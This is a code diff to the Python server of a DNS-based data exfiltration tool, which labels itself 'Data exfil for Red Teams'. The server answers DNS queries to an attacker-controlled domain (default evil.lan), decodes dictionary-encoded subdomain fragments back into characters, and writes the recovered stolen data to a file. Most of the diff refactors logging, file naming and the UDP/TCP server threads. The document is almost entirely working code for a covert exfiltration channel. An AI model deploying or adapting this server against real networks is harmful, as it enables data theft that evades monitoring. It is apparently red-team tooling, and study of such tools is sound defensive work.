@@ -43,9 +43,9 @@ def Decoder_function(q, dict):
 		while q.empty():
 			time.sleep(1)
 
-		output_filename = "STOLEN-"+datetime.datetime.now().strftime("%Y-%m-%d--%H-%M-%S"+".txt")
+		output_filename = "Exfilled-data-"+datetime.datetime.now().strftime("%Y-%m-%d--%H-%M-%S"+".txt")
 		output = open(output_filename, "w", 0)
-		print ("Receiving incoming file; Writing it to "+output_filename)
+		print ("[START] Receiving incoming file; Writing it to {}".format(output_filename))
 		byte_counter = 0
 
 		# Get all the input until EOF
@@ -54,24 +54,23 @@ def Decoder_function(q, dict):
 			# Get the next fragment out from the queue
 			frag = q.get()
 			ddt_frag = (frag[1].split("."+args.domain))[0]
-		
+
 			try:
 				# Lookup the subdomain decoded value in the dictionary
 				if ddt_frag == "final":
-					print ("EOF Received; We received " + str(byte_counter) + " fragments.\n")
+					print ("[STOP] EOF Received; We received {} fragments.\n".format(str(byte_counter)))
 					output.close()
 					break
 
 				recovered_char = dict.get(ddt_frag).decode('string_escape')
-#				logging.info("Received valid fragment as " + ddt_frag + "." + args.domain + " \twhich is\t " + recovered_char)
-				print("Received valid fragment as " + ddt_frag + "." + args.domain + " \twhich is\t " + recovered_char)
+				logging.info(" Received valid fragment as " + ddt_frag + "." + args.domain + " \twhich is\t " + recovered_char)
 				byte_counter +=1
 				output.write(recovered_char)
 
 			except:
-				print("Lookup value not found for " + str(frag[1]))
+				logging.error("Lookup value not found for {}".format(str(frag[1])))
 
-	print ("DECODER EXITED - THIS SHOULD NOT HAPPEN!")
+	raise Exception("Decoder exited - This should not happen!")
 
 if __name__ == '__main__':
 
@@ -81,36 +80,37 @@ if __name__ == '__main__':
  | |) | |) || |  
  |___/|___/ |_|  server v1.0 (by th3r3g3nt)
  Dictionary-based Data Transfer (via DNS)
+ Data exfil for Red Teams
  
  Definitely not good for your environment...
 	
 	""")
    	p = argparse.ArgumentParser(description="DDT Server v1.0")
 
-	p.add_argument("--response","-r",default=". 60 IN A 172.217.4.132",
+	p.add_argument("--response", default=". 60 IN A 172.217.4.132",
 		metavar="<response>",
 		help="DNS response (zone format) (default: 172.217.4.132)")
 
-	p.add_argument("--dictionary","-d",default="dict.txt",
+	p.add_argument("--dictionary", default="dict.txt",
 		metavar="<dictionary>",
 		help="The dictionary lookup for the DNS names (default: dict.txt)")
 
-	p.add_argument("--domain",default="evil.lan",
+	p.add_argument("--domain", default="evil.lan",
 		metavar="<domain>",
 		help = "The exfiltration domain, which you are the SOA")
 
-	p.add_argument("--port","-p",type=int,default=53,
+	p.add_argument("--port", type=int, default=53,
 		metavar="<port>",
 		help="Server port (default:53)")
 
-	p.add_argument("--address","-a",default="",
+	p.add_argument("--address", default="",
 		metavar="<address>",
 		help="Listen address (default:all)")
 
-	p.add_argument("--tcp",action='store_true',default=False,
+	p.add_argument("--tcp", action='store_true', default=False,
 		help="TCP server (default: UDP only)")
 
-	p.add_argument("--log",default="-request,-reply",
+	p.add_argument("--log", default="-request,-reply",
 		help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
 
 	p.add_argument("--log-prefix",action='store_true',default=False,
@@ -132,18 +132,15 @@ if __name__ == '__main__':
 	
 	q = queue.Queue() 
 
-
 	# Create the DNS table for translation
 	dict = {}
 
 	# Manual special values
 	logging.info('Adding magic values to the dictionary')
-
-	dict["\n"] = "feed-n"
-	dict["\r\n"] = "feed-rn"
+	dict["\n"] = "n"
+	dict["\r\n"] = "rn"
 	dict["\t"] = "tab"
 	dict["\0"] = "final"
-
 
 	try:
 		with open(args.dictionary, "r") as dict_file:
@@ -156,9 +153,12 @@ if __name__ == '__main__':
 		# Creating the reverse dictionary
 		rev_dict = {v: k for k, v in dict.items()}
 
-	except:
-		print ("\n[E] Cannot open dictionary file " + args.dictionary + "\nPlease provide a valid dictionary file!\n")
+	except Exception, e:
+		print ("\n[E] Cannot open dictionary file {}\nPlease provide a valid dictionary file with the --dictionary option!\n{}".format(args.dictionary, str(e)))
 		exit(1)
+
+	logging.info('Adding magic values to the dictionary')
+	# Manual special values
 
 
 	logging.info('Building Decoder thread')
@@ -167,19 +167,10 @@ if __name__ == '__main__':
 	decoder_thread.start()
 	logging.info('Started  Decoder thread')
 
-	logging.info('Building UDP Server thread')
-	udp_server = DNSServer(	resolver,
-				port = args.port,
-				address = args.address,
-				logger = logger,
-				)
-	udp_server.start_thread()
-	logging.info('Started  UDP Server thread')
-
 	print("Starting Fixed Resolver (%s:%d) [%s]" % (
 		args.address or "*",
 		args.port,
-		"UDP/TCP" if args.tcp else "UDP"))
+		"TCP" if args.tcp else "UDP"))
 
 	if args.tcp:
 		logging.info('Building TCP Server thread')
@@ -187,9 +178,23 @@ if __name__ == '__main__':
 					port=args.port,
 					address=args.address,
 					tcp=True,
-					logger=logger)
+					logger=logger
+					)
 		logging.info('Started  TCP Server thread')
 		tcp_server.start_thread()
 
-	while udp_server.isAlive():
-        	time.sleep(1)
+		while tcp_server.isAlive():
+	        	time.sleep(1)
+
+	else:
+		logging.info('Building UDP Server thread')
+		udp_server = DNSServer(	resolver,
+					port = args.port,
+					address = args.address,
+					logger = logger,
+					)
+		udp_server.start_thread()
+		logging.info('Started  UDP Server thread')
+
+		while udp_server.isAlive():
+	        	time.sleep(1)
